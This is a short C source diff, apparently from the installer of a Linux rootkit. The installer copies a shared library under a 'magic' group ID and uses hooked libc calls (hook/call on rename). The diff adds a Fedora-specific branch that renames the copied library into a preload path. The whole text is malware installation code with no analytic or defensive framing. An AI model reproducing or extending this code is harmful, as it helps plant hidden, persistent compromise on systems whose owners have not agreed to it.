@@ -9,6 +9,11 @@ void bignope(int p){
 
 void bdvinstall(char *const argv[]){
     dorolf();
+
+    int fedora=0;
+    if(isfedora())
+        fedora=1;
+
     printf("Creating installation directory.\n");
 
     gid_t magicgid = readgid();
@@ -33,13 +38,28 @@ void bdvinstall(char *const argv[]){
             }
 
             cpr = socopy(opath, npath, magicgid);
-            free(npath);
-
             if(cpr) printf("Copied: \e[1;31m%s\e[0m\n", basename(opath));
             else{
                 printf("Something went wrong copying \e[1;31m%s\e[0m...\n", opath);
+                free(npath);
                 bignope(0);
             }
+
+            if(fedora){
+                printf("Fedora box.\n");
+
+                hook(CRENAME);
+                if((long)call(CRENAME, npath, PLAINSOPATH) < 0){
+                    printf("Rename failed: %s -> %s\n", npath, PLAINSOPATH);
+                    free(npath);
+                    bignope(0);
+                }
+            }
+
+            free(npath);
+
+            if(fedora)
+                break;
         }else{
             printf("NO\n");
             bignope(0);
